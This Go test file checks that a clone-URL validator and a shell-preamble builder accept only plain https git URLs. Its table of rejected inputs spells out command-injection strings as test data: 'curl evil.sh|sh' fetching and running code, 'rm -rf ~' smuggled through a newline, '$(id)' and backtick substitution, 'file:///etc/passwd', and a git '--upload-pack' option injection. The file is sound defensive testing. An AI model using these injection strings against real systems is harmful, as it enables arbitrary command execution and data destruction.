package executor

import (
	"strings"
	"testing"
)

// M-EXECUTOR-ENV-HARDENING D5 / AC4: the clone-review preamble interpolates
// --clone-repo into shell text the agent runs EXACTLY, so only a plain https
// URL may reach it — through both entry points.
func TestValidateCloneURL_Table(t *testing.T) {
	valid := []string{
		testRepoURL,
		"https://github.com/sunholo-data/ailang",
		"https://gitlab.example.com:8443/group/sub-group/repo.git",
		"https://github.com/owner/repo_name.v2",
	}
	for _, u := range valid {
		if err := ValidateCloneURL(u); err != nil {
			t.Errorf("ValidateCloneURL(%q) = %v, want nil", u, err)
		}
	}
	invalid := map[string]string{
		"semicolon":        "https://github.com/a/b;curl evil.sh|sh",
		"command subst":    "https://github.com/a/$(id)",
		"backticks":        "https://github.com/a/`id`",
		"space":            "https://github.com/a/b repo",
		"newline":          "https://github.com/a/b\nrm -rf ~",
		"pipe":             "https://github.com/a/b|sh",
		"ampersand":        "https://github.com/a/b&&id",
		"quote":            "https://github.com/a/b'",
		"redirect":         "https://github.com/a/b>out",
		"http":             "http://github.com/a/b",
		"ssh":              "git@github.com:a/b.git",
		"ssh url":          "ssh://git@github.com/a/b.git",
		"file":             "file:///etc/passwd",
		"option injection": "--upload-pack=touch /tmp/x",
		"empty host":       "https:///a/b",
		"no path":          "https://github.com",
		"userinfo":         "https://user:token@github.com/a/b",
		"query":            "https://github.com/a/b?x=1",
		"fragment":         "https://github.com/a/b#frag",
		"dotdot":           "https://github.com/a/../b",
		"empty segment":    "https://github.com//b",
	}
	for name, u := range invalid {
		if err := ValidateCloneURL(u); err == nil {
			t.Errorf("%s: ValidateCloneURL(%q) = nil, want error", name, u)
		}
	}
}

func TestBuildClonePreamble_RejectsMetacharacterURL(t *testing.T) {
	_, err := BuildClonePreamble("https://github.com/a/b;id", "")
	if err == nil || !strings.Contains(err.Error(), "plain https git URL") {
		t.Fatalf("BuildClonePreamble with ';' = %v, want the named URL error", err)
	}
	// The SHA mode interpolates the URL too (git remote add origin <URL>).
	if _, err := BuildClonePreamble("https://github.com/a/$(id)", testSHA); err == nil {
		t.Fatal("BuildClonePreamble SHA mode accepted a $(…) URL")
	}
}

func TestValidateCloneFlags_RejectsNonHTTPSURL(t *testing.T) {
	for _, u := range []string{"http://github.com/a/b", "https://github.com/a/b`id`"} {
		if _, err := ValidateCloneFlags(u, "", false, "managed_agents", true); err == nil {
			t.Errorf("ValidateCloneFlags(%q) = nil, want error", u)
		}
	}
	// The two legitimate modes keep working.
	if egress, err := ValidateCloneFlags(testRepoURL, testSHA, false, "managed_agents", true); err != nil || !egress {
		t.Errorf("ValidateCloneFlags(valid URL+SHA) = %v, %v; want true, nil", egress, err)
	}
}
